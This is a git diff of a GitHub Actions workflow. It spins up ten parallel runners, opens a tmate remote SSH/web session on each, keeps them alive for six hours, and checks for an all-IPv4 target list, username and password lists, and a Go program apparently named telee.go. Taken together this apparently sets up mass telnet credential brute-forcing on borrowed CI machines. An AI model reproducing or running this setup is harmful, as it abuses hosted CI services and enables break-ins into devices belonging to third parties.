@@ -15,7 +15,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
 
     steps:
       - uses: actions/checkout@v4
@@ -23,33 +23,19 @@ jobs:
       - name: Install dependencies
         run: sudo apt update && sudo apt install wget tmate -y
 
-      - name: Start tmate in background
+      - name: Start tmate session
         run: |
-          # Kill any existing tmate sessions
           pkill tmate || true
-          
-          # Start new tmate session
+
           tmate -S /tmp/tmate.sock new-session -d
           tmate -S /tmp/tmate.sock wait tmate-ready
-          
+
           echo "🟢 TMATE SESSION STARTED"
           echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')"
           echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')"
-          
-          # Save connection info to file for debugging
-          {
-            echo "Instance: ${{ matrix.instance }}"
-            echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')"
-            echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')"
-            echo "---"
-          } >> tmate_connections.txt
-          
-          # Background loop to keep tmate alive
-          while true; do
-            sleep 60
-            echo "🤖 Tmate session still active for instance ${{ matrix.instance }} at $(date)"
-          done &
-          echo "TMATE_LOOP_PID=$!" >> $GITHUB_ENV
+
+          echo "Keeping session alive..."
+          sleep 21600
 
       - name: Print job info
         run: echo "🔹 Running instance ${{ matrix.instance }} of 20"
@@ -61,7 +47,6 @@ jobs:
 
       - name: Check required files
         run: |
-          # Check if required files exist
           MISSING_FILES=""
           for file in all_ipv4.txt user.txt pass.txt; do
             if [ ! -f "$file" ]; then
@@ -69,12 +54,12 @@ jobs:
               MISSING_FILES="$MISSING_FILES $file"
             fi
           done
-          
+
           if [ ! -f "telee.go" ] && [ ! -f "main.go" ]; then
-            echo "⚠️ Warning: No Go source file found (telee.go or main.go)!"
+            echo "⚠️ Warning: No Go source file found!"
             MISSING_FILES="$MISSING_FILES go_source"
           fi
-          
+
           if [ -n "$MISSING_FILES" ]; then
             echo "MISSING_FILES=$MISSING_FILES" >> $GITHUB_ENV
           fi
